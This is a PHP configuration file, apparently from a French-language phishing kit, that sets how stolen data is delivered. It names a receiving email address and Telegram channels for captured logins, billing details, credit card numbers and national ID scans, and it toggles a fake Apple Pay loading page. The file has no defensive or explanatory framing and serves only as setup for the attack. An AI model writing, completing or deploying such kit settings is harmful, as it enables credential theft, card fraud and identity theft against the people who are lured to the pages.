<?php

##### SETTINGS ######


# Mail
$mail_sending = true;                                           # False pour ne pas recevoir par Mail
$rezmail = "moonlight922@outlook.fr"; 

#Telegram
$telegram_sending = false;                                       # False pour ne pas recevoir par Telegram
$bot_token = "";
$chat_login = "";                                 # Channel de réception des logins
$chat_billing = "";                               # Channel de réception des billings ( Page d'informations )
$chat_card = "";                                  # Channel de réception des cardings ( Page de carte de crédit )
$chat_cni = "";

$apple_pay = true;
$timer = 20; # C'est le temps d'attente dans le chargement Apple Pay

$cni = false;  # Activation de la page CNI ( Soit Apple Pay, Soit CNI )

$test_mode = false;

?>